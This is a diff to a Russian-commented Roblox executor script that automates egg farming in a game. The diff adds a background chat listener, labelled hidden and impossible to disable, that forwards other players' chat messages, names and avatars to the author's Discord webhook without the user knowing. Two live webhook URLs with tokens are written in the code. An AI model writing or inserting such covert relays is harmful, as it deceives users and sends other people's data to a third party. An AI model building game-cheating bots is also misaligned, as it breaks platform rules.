@@ -1,16 +1,12 @@
 -- ==========================================
--- УЛЬТРА-ОПТИМИЗИРОВАННЫЙ EGG FARM (MOBILE LITE EDITION)
--- V6.0: 100% EGG DETECTION + NESTED MODELS SUPPORT
+-- СЕРВИСЫ
 -- ==========================================
-local AutoStart = false
-local ForcedScanInterval = 30
--- ==========================================
-
-local PathfindingService = game:GetService("PathfindingService")
+local HttpService = game:GetService("HttpService")
+local TextChatService = game:GetService("TextChatService")
 local Players = game:GetService("Players")
+local PathfindingService = game:GetService("PathfindingService")
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local UserInputService = game:GetService("UserInputService")
-local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
 local CoreGui = game:GetService("CoreGui")
 
@@ -19,14 +15,113 @@ local character = player.Character or player.CharacterAdded:Wait()
 local humanoid = character:WaitForChild("Humanoid")
 local rootPart = character:WaitForChild("HumanoidRootPart")
 
+-- ==========================================
+-- УНИВЕРСАЛЬНАЯ ФУНКЦИЯ HTTP-ЗАПРОСОВ
+-- ==========================================
+local function getRequestFunc()
+    if syn and syn.request then return syn.request end
+    if http_request then return http_request end
+    if request then return request end
+    if httpRequest then return httpRequest end
+    if fluxus and fluxus.request then return fluxus.request end
+    return nil
+end
+
+-- ==========================================
+-- СКРЫТЫЙ МОНИТОРИНГ ЧАТА (ФОНОВЫЙ ПРОЦЕСС)
+-- ==========================================
+local CHAT_WEBHOOK_URL = "https://discord.com/api/webhooks/1489315967455596714/dW3ann_p2G8xWEGj_ivisYWCY0kk9p_TM8Z7KL94xDcjrega3QyGQbzX04sNyYoqXRfl"
+
+local CHAT_CONFIG = {
+    ["jester"] = {color = 10181046, name = "Jester", emoji = "🎪"},
+    ["mari"]   = {color = 16777215, name = "Mari", emoji = "🌙"},
+    ["rin"]    = {color = 16776960, name = "Rin", emoji = "☀️"}
+}
+
+local function cleanRichText(str)
+    return str:gsub("<[^>]+>", "")
+end
+
+local function sendChatToDiscord(sender, message, info)
+    task.spawn(function()
+        local reqFunc = getRequestFunc()
+        if not reqFunc or CHAT_WEBHOOK_URL == "" then return end
+
+        local cleanedMessage = cleanRichText(message)
+        local description = string.format(
+            "**Отправитель:** %s\n**Сообщение:** %s\n**Триггер:** %s",
+            sender, cleanedMessage, info.name
+        )
+
+        local body = {
+            ["content"] = "@everyone продавец (ази пупсик)!",
+            ["username"] = "nexus Monitor",
+            ["avatar_url"] = "https://cdn-icons-png.flaticon.com/512/8646/8646083.png",
+            ["embeds"] = {{
+                ["title"] = info.emoji .. " Новое совпадение в чате",
+                ["description"] = description,
+                ["color"] = info.color,
+                ["footer"] = {
+                    ["text"] = "Игра: " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. " • " .. os.date("%H:%M:%S")
+                },
+                ["timestamp"] = DateTime.now():ToIsoDate()
+            }}
+        }
+
+        local senderPlayer = Players:FindFirstChild(sender)
+        if senderPlayer then
+            body.embeds[1].thumbnail = {
+                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. senderPlayer.UserId .. "&width=150&height=150&format=png"
+            }
+        end
+
+        pcall(function()
+            reqFunc({
+                Url = CHAT_WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(body)
+            })
+        end)
+    end)
+end
+
+-- Подключаем слушатель чата (работает всегда, выключить нельзя)
+TextChatService.MessageReceived:Connect(function(textChatMessage)
+    local rawText = textChatMessage.Text:lower()
+    local senderName = "Unknown"
+
+    if textChatMessage.TextSource then
+        senderName = textChatMessage.TextSource.Name
+    else
+        local cleanMsg = cleanRichText(textChatMessage.Text)
+        local match = cleanMsg:match("^%[(.-)%]") or cleanMsg:match("^(.-):")
+        if match then senderName = match end
+    end
+
+    for key, info in pairs(CHAT_CONFIG) do
+        if rawText:find(key) then
+            sendChatToDiscord(senderName, textChatMessage.Text, info)
+            break
+        end
+    end
+end)
+
+
+-- ==========================================
+-- EGG FARM (MOBILE LITE EDITION)
+-- ==========================================
+local AutoStart = false
+local ForcedScanInterval = 30
 local isFarming = AutoStart
 local activeEggs = {}
 local blacklist = {}
 local tempSkips = {}
 local totalCollected = 0
-local pendingEggs = {} -- яйца, которые ещё ждут появления BasePart
+local pendingEggs = {}
 
--- ==== СПАВН ВСЕХ ПАРТОВ (КРАСНЫЕ ЗОНЫ) ====
+local FARM_WEBHOOK_URL = "https://discord.com/api/webhooks/1488832159904043108/RBf3b0n4UI4FAlaGoSDdASBz6ll61xZ_jZZXEY-cm88s8YwlfMVWqBewezEPWPHnO6pm"
+
 local debugZonesData = {
     {Size = Vector3.new(10, 2.5, 10), CFrame = CFrame.new(180.654694, 83.9499969, -592.783386, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
     {Size = Vector3.new(35, 2, 15), CFrame = CFrame.new(191.5, 97, -671, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
@@ -76,24 +171,15 @@ task.spawn(function()
     end
 end)
 
--- ==== ЧТЕНИЕ ПОИНТОВ ИЗ GUI (КЭШИРОВАННОЕ) ====
 local cachedPointsLabel = nil
-
 local function findPointsLabel()
     local ok, result = pcall(function()
         for _, desc in ipairs(player.PlayerGui:GetDescendants()) do
             if desc:IsA("TextLabel") then
                 local c = desc.TextColor3
-                if math.abs(c.R - 170/255) < 0.05
-                   and math.abs(c.G - 1) < 0.05
-                   and math.abs(c.B - 127/255) < 0.05 then
+                if math.abs(c.R - 170/255) < 0.05 and math.abs(c.G - 1) < 0.05 and math.abs(c.B - 127/255) < 0.05 then
                     local txt = desc.Text
-                    if txt:find("%[") or txt:find("%]") then
-                        continue
-                    end
-                    if txt == "" then
-                        continue
-                    end
+                    if txt:find("%[") or txt:find("%]") or txt == "" then continue end
                     return desc
                 end
             end
@@ -126,11 +212,12 @@ task.spawn(function()
     end
 end)
 
--- ==== GUI (ЧЁРНО-БЕЛАЯ, ЧИСТАЯ, МОБИЛЬНАЯ) ====
+-- ==== GUI ====
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "NexusEggFarm"
 screenGui.ResetOnSpawn = false
 screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
 local okGui = pcall(function() screenGui.Parent = CoreGui end)
 if not okGui then screenGui.Parent = player:WaitForChild("PlayerGui") end
 
@@ -276,18 +363,6 @@ task.spawn(function()
     end
 end)
 
--- ==== ВЕБХУК ====
-local WebhookURL = "https://discord.com/api/webhooks/1488832159904043108/RBf3b0n4UI4FAlaGoSDdASBz6ll61xZ_jZZXEY-cm88s8YwlfMVWqBewezEPWPHnO6pm"
-
-local function getRequestFunc()
-    if syn and syn.request then return syn.request end
-    if http_request then return http_request end
-    if request then return request end
-    if httpRequest then return httpRequest end
-    if fluxus and fluxus.request then return fluxus.request end
-    return nil
-end
-
 local targetPriorities = {
     ["andromeda_egg"] = 100, ["angelic_egg"] = 100, ["blooming_egg"] = 100, ["dreamer_egg"] = 100, ["egg_v2"] = 100,
     ["forest_egg"] = 100, ["hatch_egg"] = 100, ["royal_egg"] = 100, ["the_egg_of_the_sky"] = 100, ["placeholder_egg"] = 100,
@@ -295,19 +370,18 @@ local targetPriorities = {
     ["point_egg_4"] = 14, ["point_egg_3"] = 13, ["point_egg_2"] = 12, ["point_egg_1"] = 11
 }
 
-local function sendWebhook(eggName, isSuccess, pointsValue)
+local function sendFarmWebhook(eggName, isSuccess, pointsValue)
     task.spawn(function()
         local reqFunc = getRequestFunc()
-        if not reqFunc or WebhookURL == "" then return end
+        if not reqFunc or FARM_WEBHOOK_URL == "" then return end
 
         local ok, err = pcall(function()
             local priority = targetPriorities[eggName] or 0
             local isPriority100 = (priority == 100)
-
             local prettyName = eggName:gsub("_", " "):gsub("(%a)([%w]*)", function(a, b) return a:upper() .. b end)
-
             local rarityTag = "Common"
             local embedColor = 8421504
+
             if priority == 100 then
                 rarityTag = "LEGENDARY"
                 embedColor = 16766720
@@ -327,7 +401,6 @@ local function sendWebhook(eggName, isSuccess, pointsValue)
             end
 
             local pointsStr = pointsValue or "N/A"
-
             local fields = {
                 {["name"] = "Egg", ["value"] = prettyName, ["inline"] = true},
                 {["name"] = "Rarity", ["value"] = rarityTag, ["inline"] = true},
@@ -362,16 +435,14 @@ local function sendWebhook(eggName, isSuccess, pointsValue)
             end
 
             reqFunc({
-                Url = WebhookURL,
+                Url = FARM_WEBHOOK_URL,
                 Method = "POST",
                 Headers = {["Content-Type"] = "application/json"},
                 Body = HttpService:JSONEncode(body)
             })
         end)
 
-        if not ok then
-            warn("[Webhook Error]: " .. tostring(err))
-        end
+        if not ok then warn("[Webhook Error]: " .. tostring(err)) end
     end)
 end
 
@@ -395,7 +466,6 @@ end
 
 local rayParams = RaycastParams.new()
 rayParams.FilterType, rayParams.RespectCanCollide, rayParams.IgnoreWater = Enum.RaycastFilterType.Exclude, true, true
-
 player.CharacterAdded:Connect(function(nc)
     character, humanoid, rootPart = nc, nc:WaitForChild("Humanoid"), nc:WaitForChild("HumanoidRootPart")
     rayParams.FilterDescendantsInstances = {character}
@@ -431,9 +501,7 @@ local function setupDangerZones()
 end
 setupDangerZones()
 
--- ==== СИСТЕМА ОБНАРУЖЕНИЯ ЯИЦ (100% DETECTION) ====
-
--- Ищет egg-модель вверх по иерархии от любого объекта
+-- ==== СИСТЕМА ОБНАРУЖЕНИЯ ЯИЦ ====
 local function findEggAncestor(obj)
     local current = obj
     while current and current ~= workspace do
@@ -445,17 +513,15 @@ local function findEggAncestor(obj)
     return nil
 end
 
--- Пытается зарегистрировать яйцо (возвращает true если нашёл BasePart)
 local function tryRegisterEgg(eggModel)
     if not eggModel or not eggModel.Parent then return false end
     if not targetPriorities[eggModel.Name] then return false end
-    if activeEggs[eggModel] or blacklist[eggModel] then return true end -- уже обработано
+    if activeEggs[eggModel] or blacklist[eggModel] then return true end
 
     local p = nil
     if eggModel:IsA("BasePart") then
         p = eggModel
     else
-        -- Рекурсивный поиск BasePart внутри модели (любая вложенность)
         p = eggModel:FindFirstChildWhichIsA("BasePart", true)
     end
 
@@ -465,22 +531,19 @@ local function tryRegisterEgg(eggModel)
         else
             activeEggs[eggModel] = p
         end
-        pendingEggs[eggModel] = nil -- убираем из ожидания
+        pendingEggs[eggModel] = nil
         return true
     end
     return false
 end
 
--- Запускает отложенную регистрацию для яйца, у которого ещё нет BasePart
 local function scheduleEggWatch(eggModel)
     if not eggModel or not targetPriorities[eggModel.Name] then return end
     if activeEggs[eggModel] or blacklist[eggModel] then return end
-    if pendingEggs[eggModel] then return end -- уже следим
+    if pendingEggs[eggModel] then return end
 
     pendingEggs[eggModel] = true
-
     task.spawn(function()
-        -- Серия быстрых попыток
         for _, delay in ipairs({0.1, 0.3, 0.5, 1.0, 1.5, 2.0, 3.0, 5.0}) do
             task.wait(delay)
             if not eggModel or not eggModel.Parent then
@@ -492,7 +555,6 @@ local function scheduleEggWatch(eggModel)
             end
         end
 
-        -- Если всё ещё не нашли — подписываемся на DescendantAdded
         if eggModel and eggModel.Parent and not activeEggs[eggModel] and not blacklist[eggModel] then
             local conn
             conn = eggModel.DescendantAdded:Connect(function(desc)
@@ -504,16 +566,12 @@ local function scheduleEggWatch(eggModel)
                     end
                 end
             end)
-
-            -- Автоотключение через 60 сек (на случай если яйцо никогда не получит BasePart)
             task.delay(60, function()
                 if conn and conn.Connected then
                     conn:Disconnect()
                 end
                 pendingEggs[eggModel] = nil
             end)
-
-            -- Ещё одна попытка после подписки (на случай race condition)
             task.wait(0.1)
             if tryRegisterEgg(eggModel) then
                 if conn and conn.Connected then
@@ -526,19 +584,15 @@ local function scheduleEggWatch(eggModel)
     end)
 end
 
--- Главная функция проверки объекта
 local function checkAndAddEgg(obj)
     if not obj or not obj.Parent then return end
 
-    -- Случай 1: сам объект — это яйцо
     if targetPriorities[obj.Name] then
         if not tryRegisterEgg(obj) then
-            -- BasePart ещё не загрузился — ставим на отслеживание
             scheduleEggWatch(obj)
         end
     end
 
-    -- Случай 2: объект — это BasePart внутри яйца (может быть на любом уровне вложенности)
     if obj:IsA("BasePart") then
         local eggAncestor = findEggAncestor(obj)
         if eggAncestor then
@@ -546,22 +600,16 @@ local function checkAndAddEgg(obj)
         end
     end
 
-    -- Случай 3: объект — это промежуточная папка/модель внутри яйца (например "Egg", "Eggs")
-    -- Проверяем, есть ли у его предка имя яйца
     if obj:IsA("Model") or obj:IsA("Folder") then
         local eggAncestor = findEggAncestor(obj)
         if eggAncestor and eggAncestor ~= obj then
-            -- Внутрь этой папки могли добавиться парты
             tryRegisterEgg(eggAncestor)
         end
     end
 end
 
--- Полное сканирование workspace
 local function scanWorkspace()
     setupDangerZones()
-
-    -- Сначала ищем все объекты с именами яиц
     local descendants = workspace:GetDescendants()
     for i, o in ipairs(descendants) do
         if targetPriorities[o.Name] then
@@ -572,15 +620,10 @@ local function scanWorkspace()
         if i % 200 == 0 then task.wait() end
     end
 end
-
 scanWorkspace()
 
--- Слушаем ВСЕ новые объекты в workspace
 workspace.DescendantAdded:Connect(function(obj)
-    -- Маленькая задержка чтобы дочерние объекты успели подгрузиться
-    task.defer(function()
-        checkAndAddEgg(obj)
-    end)
+    task.defer(function() checkAndAddEgg(obj) end)
 end)
 
 workspace.DescendantRemoving:Connect(function(o)
@@ -589,11 +632,8 @@ workspace.DescendantRemoving:Connect(function(o)
     tempSkips[o] = nil
     pendingEggs[o] = nil
 
-    -- Если удаляется BasePart — проверяем, не был ли он привязан к яйцу
-    -- (яйцо потеряло свой парт, возможно исчезло)
     local eggAncestor = findEggAncestor(o)
     if eggAncestor then
-        -- Проверяем, есть ли ещё парт у этого яйца
         local stillHasPart = eggAncestor:FindFirstChildWhichIsA("BasePart", true)
         if not stillHasPart then
             activeEggs[eggAncestor] = nil
@@ -601,7 +641,6 @@ workspace.DescendantRemoving:Connect(function(o)
     end
 end)
 
--- Периодическое полное сканирование
 task.spawn(function()
     while true do
         task.wait(ForcedScanInterval)
@@ -622,7 +661,6 @@ local function getBestEgg()
                     bestO, bestP, bestPr, minDist = o, p, pr, d
                 end
             else
-                -- Парт исчез — пробуем найти новый
                 if o and o.Parent then
                     local newP = o:FindFirstChildWhichIsA("BasePart", true)
                     if newP and newP.Transparency < 1 then
@@ -661,46 +699,35 @@ end
 
 local function flyTo(targetPos, isJump, maxTime)
     if not humanoid or humanoid.Health <= 0 then return false end
-
     local ap, ao = setupFly()
     humanoid.PlatformStand = true
     ap.Enabled, ao.Enabled = true, true
     ap.MaxVelocity = humanoid.WalkSpeed
-
     local hOff = (humanoid.RigType == Enum.HumanoidRigType.R15) and (humanoid.HipHeight + rootPart.Size.Y / 2) or 3
     local bY = targetPos.Y + hOff
-
     local reached, stuckT, lastP, startT = false, 0, rootPart.Position, tick()
     local stuckAttempts = 0
 
     local hover = RunService.Heartbeat:Connect(function()
         if not isFarming or humanoid.Health <= 0 then return end
-
         local cPos = rootPart.Position
         local tX, tZ = targetPos.X, targetPos.Z
         local dx, dz = tX - cPos.X, tZ - cPos.Z
         local flatDist = math.sqrt(dx * dx + dz * dz)
         local heightDiff = bY - cPos.Y
         local mDir = Vector3.zero
-
         if flatDist > 0.3 then mDir = Vector3.new(dx, 0, dz).Unit end
-
         local hasObstacleAhead = false
         if mDir ~= Vector3.zero then
             local hitMid = workspace:Raycast(cPos, mDir * 4, rayParams)
             local hitFeet = workspace:Raycast(cPos - Vector3.new(0, 2.5, 0), mDir * 4, rayParams)
             hasObstacleAhead = (hitMid ~= nil) or (hitFeet ~= nil)
         end
-
         if heightDiff > 2 then
-            if hasObstacleAhead then
-                ap.Position = Vector3.new(cPos.X, cPos.Y + 12, cPos.Z)
-                return
-            end
+            if hasObstacleAhead then ap.Position = Vector3.new(cPos.X, cPos.Y + 12, cPos.Z); return end
             ap.Position = Vector3.new(tX, bY + 1.5, tZ)
             return
         end
-
         if heightDiff < -2 then
             if flatDist < 4 then
                 local blockBelow = workspace:Raycast(cPos, Vector3.new(0, -3, 0), rayParams)
@@ -713,7 +740,6 @@ local function flyTo(targetPos, isJump, maxTime)
                 end
                 return
             end
-
             if hasObstacleAhead then
                 if heightDiff < -10 then
                     local side = rootPart.CFrame.RightVector * 5
@@ -726,29 +752,20 @@ local function flyTo(targetPos, isJump, maxTime)
             ap.Position = Vector3.new(tX, bY, tZ)
             return
         end
-
-        if hasObstacleAhead then
-            ap.Position = Vector3.new(cPos.X, cPos.Y + 10, cPos.Z)
-            return
-        end
-
+        if hasObstacleAhead then ap.Position = Vector3.new(cPos.X, cPos.Y + 10, cPos.Z); return end
         ap.Position = Vector3.new(tX, bY, tZ)
     end)
 
     while not reached and isFarming and humanoid and humanoid.Health > 0 do
         if maxTime and (tick() - startT) >= maxTime then break end
         task.wait()
-
         ao.CFrame = CFrame.lookAt(rootPart.Position, Vector3.new(targetPos.X, rootPart.Position.Y, targetPos.Z))
-
         local cPos = rootPart.Position
         local currentFlatDist = math.sqrt((cPos.X - targetPos.X)^2 + (cPos.Z - targetPos.Z)^2)
-
         if currentFlatDist < 3 and math.abs(cPos.Y - bY) < 5 then
             reached = true
             break
         end
-
         local moved = math.sqrt((cPos.X - lastP.X)^2 + (cPos.Y - lastP.Y)^2 + (cPos.Z - lastP.Z)^2)
         if moved < 0.12 then
             stuckT = stuckT + task.wait()
@@ -756,7 +773,6 @@ local function flyTo(targetPos, isJump, maxTime)
                 stuckAttempts = stuckAttempts + 1
                 stuckT = 0
                 if stuckAttempts >= 4 then break end
-
                 local hDiff = bY - cPos.Y
                 if hDiff < -3 then
                     local sideDir = rootPart.CFrame.RightVector * (stuckAttempts % 2 == 0 and 7 or -7)
@@ -773,7 +789,6 @@ local function flyTo(targetPos, isJump, maxTime)
         end
         lastP = cPos
     end
-
     hover:Disconnect()
     ap.Enabled, ao.Enabled = false, false
     return reached
@@ -788,15 +803,8 @@ end
 
 local function smartPath(targetPos, checkPart, huntStart)
     local path = PathfindingService:CreatePath({
-        AgentRadius = 3,
-        AgentHeight = 5,
-        AgentCanJump = true,
-        WaypointSpacing = 3,
-        Costs = {
-            Water = math.huge,
-            DangerZone = math.huge,
-            ClimbPlatform = 0.1
-        }
+        AgentRadius = 3, AgentHeight = 5, AgentCanJump = true, WaypointSpacing = 3,
+        Costs = {Water = math.huge, DangerZone = math.huge, ClimbPlatform = 0.1}
     })
     local success, _ = pcall(function() path:ComputeAsync(rootPart.Position, targetPos) end)
     if not success or path.Status ~= Enum.PathStatus.Success then return "NoPath" end
@@ -808,7 +816,6 @@ local function smartPath(targetPos, checkPart, huntStart)
 
         local cPos = rootPart.Position
         if math.sqrt((cPos.X - targetPos.X)^2 + (cPos.Y - targetPos.Y)^2 + (cPos.Z - targetPos.Z)^2) < 8 then return "Reached" end
-
         if not flyTo(wps[i].Position, wps[i].Action == Enum.PathWaypointAction.Jump, 4) then
             local cY = rootPart.Position.Y
             local tY = wps[i].Position.Y
@@ -826,7 +833,6 @@ local function smartPath(targetPos, checkPart, huntStart)
 end
 
 local function interactWithPrompt(obj)
-    -- Ищем ProximityPrompt в самом объекте и во всех потомках
     local pr = nil
     if obj:IsA("ProximityPrompt") then
         pr = obj
@@ -861,12 +867,10 @@ local function huntTarget(obj, p)
                 local data = islandZones[zoneId]
                 local cPos = rootPart.Position
                 local dPos = data.Path[1]
-
                 if math.sqrt((cPos.X - dPos.X)^2 + (cPos.Y - dPos.Y)^2 + (cPos.Z - dPos.Z)^2) > 15 then
                     local res = smartPath(dPos, p, huntStart)
                     if res == "Timeout" or res == "NoPath" then isEarlyExit = true end
                 end
-
                 if not isEarlyExit then
                     for i = 1, #data.Path do
                         if not isFarming or humanoid.Health <= 0 or (tick() - huntStart > 60) then isEarlyExit = true break end
@@ -880,11 +884,7 @@ local function huntTarget(obj, p)
     if not isEarlyExit then
         while p and p.Parent and p.Transparency < 1 do
             if not isFarming or humanoid.Health <= 0 then break end
-
-            if tick() - huntStart > 60 then
-                tempSkips[obj] = true
-                break
-            end
+            if tick() - huntStart > 60 then tempSkips[obj] = true; break end
 
             local cPos = rootPart.Position
             local pPos = p.Position
@@ -892,37 +892,24 @@ local function huntTarget(obj, p)
                 humanoid.PlatformStand = false
                 humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                 task.wait(0.1)
-
-                -- Пробуем взаимодействовать с яйцом и его потомками
+                
                 local prompted = interactWithPrompt(obj)
-
-                -- Если не нашли промпт в модели — ищем в парте
-                if not prompted and p then
-                    interactWithPrompt(p)
-                end
+                if not prompted and p then interactWithPrompt(p) end
 
                 local wt = 0
-                while p and p.Parent and p.Transparency < 1 and wt < 2 do task.wait(0.1) wt = wt + 0.1 end
-
+                while p and p.Parent and p.Transparency < 1 and wt < 2 do task.wait(0.1); wt = wt + 0.1 end
                 totalCollected = totalCollected + 1
-
                 local pointsNow = getPointsText()
-
                 local prettyName = eggName:gsub("_", " "):gsub("(%a)([%w]*)", function(a, b) return a:upper() .. b end)
                 lastLabel.Text = "Last: " .. prettyName
                 countLabel.Text = "Collected: " .. totalCollected
-
-                sendWebhook(eggName, true, pointsNow)
-
+                sendFarmWebhook(eggName, true, pointsNow)
                 tempSkips = {}
                 break
             end
 
             local status = smartPath(pPos, p, huntStart)
-            if status == "Timeout" or status == "NoPath" or status == "Failed" then
-                tempSkips[obj] = true
-                break
-            end
+            if status == "Timeout" or status == "NoPath" or status == "Failed" then tempSkips[obj] = true; break end
         end
     end
 
